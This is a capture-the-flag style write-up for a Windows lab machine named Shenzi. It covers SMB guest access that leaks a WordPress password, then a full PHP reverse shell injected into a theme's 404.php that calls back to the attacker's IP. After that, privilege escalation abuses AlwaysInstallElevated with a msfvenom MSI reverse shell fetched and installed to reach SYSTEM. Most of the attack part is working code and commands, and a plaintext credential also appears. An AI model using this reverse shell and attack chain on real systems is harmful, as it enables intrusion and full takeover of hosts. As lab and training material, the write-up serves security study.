---
description: Privilege Escalation using AlwaysInstallElevated
---

# Shenzi

## Summary

* Guest users had access to `/shenzi` directory via SMB.
* Within this directory, I found a `password.txt` file containing the credentials for a WordPress site hosted at the `/shenzi` path.
* Using these credentials, I logged into the WordPress admin panel.&#x20;
* Injected a reverse shell payload into the `404.php` page. After testing various payloads, I found that the PHP reverse shell by <mark style="color:green;">**`Ivan Sincek`**</mark> from revshell.com provided a stable connection.
* Triggering the modified `404.php` page gave me a reverse shell as a low-privileged user, allowing me to obtain the first low-privilege flag. :tada:
* To elevate privileges, I utilised `powerup.ps1` and `winPEAS` to identify potential escalation vectors.&#x20;
* _During this process, I discovered that the <mark style="color:green;">**`AlwaysInstallElevated`**</mark> setting was enabled. This Windows policy allows Windows Installer packages (.msi files) to be installed with administrative privileges._
* Leveraging this, I created a reverse shell payload embedded in a `.msi` file, uploaded it to the target machine, and installed it. This successfully granted me a reverse shell with administrator privileges, allowing me to complete the privilege escalation and achieve full control of the system.

## Let's Unpack

### Enumeration

```bash
# Nmap
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.172.55

# gobuster 
gobuster dir -u http://192.168.172.55 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 

# smbclient
smbclient //192.168.172.55/shenzi -U guest
>
smb: \> dir
  .                                   D        0  Thu May 28 21:15:09 2020
  ..                                  D        0  Thu May 28 21:15:09 2020
  passwords.txt                       A      894  Thu May 28 21:15:09 2020
  readme_en.txt                       A     7367  Thu May 28 21:15:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 21:15:09 2020
  why.tmp                             A      213  Thu May 28 21:15:09 2020
  xampp-control.ini                   A      178  Thu May 28 21:15:09 2020

# validating credentials using cme
 crackmapexec smb  192.168.172.55 -u 'admin' -p 'FeltHeadwallWight357' --continue-on-success
```



### Initial Foodhold

#### Injecting reverse shell

Updating `404.php` page to have the following PHP reverse shell

<details>

<summary>Ref Ivan Sincek shell -> <a href="https://www.revshells.com/">https://www.revshells.com/</a></summary>

```
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.226', 4444);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

</details>

```bash
# Catching Reverse shell using NetCat
nc -nlvp 4444

# BOOM! Got a shell with low-privilege user
```

### Privilege Escalation

Using [winPEAS.exe](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) and [PowerUp.ps1 ](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)to get familiar with Priv escalation vector

<pre class="language-powershell"><code class="lang-powershell"><strong># Uploading scripts to machine
</strong><strong>iwr -uri http://192.168.45.226:8000/winPEASx64.exe -outfile winPEAS.exe
</strong>iwr -uri http://192.168.45.226:8000/PowerUp.ps1 -outfile PowerUp.ps1 
</code></pre>

The above script revealed that the <mark style="background-color:red;">**AlwaysInstallElevated**</mark> setting is enabled in the Windows policy.

<pre class="language-powershell"><code class="lang-powershell">Invoke-AllChecks
>
Check         : AlwaysInstallElevated Registry Key
AbuseFunction : Write-UserAddMSI

DefaultDomainName    : SHENZI
DefaultUserName      : shenzi
DefaultPassword      : 
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 
Check                : Registry Autologons

# verifying manually
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

# both returned true
AlwaysInstallElevated    REG_DWORD    <a data-footnote-ref href="#user-content-fn-1">0x1</a>

</code></pre>

#### Exploiting to gain elevated shell

<pre class="language-sh"><code class="lang-sh"># generate payload using msfconsole
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.226 lport=9999 -a x64 --platform windows -f msi -o ignite.msi

# Uploading it to machine
iwr -uri http://192.168.45.226:8000/ignite.msi -outfile ignite.msi

# installing the msi 
msiexec /quiet /qn /i ignite.msi

# catching the shell using Netcat
nc -nlvp 9999

# Boom! got the <a data-footnote-ref href="#user-content-fn-2">NT AUTHORITY\SYSTEM</a> shell
</code></pre>







[^1]: 

[^2]: 
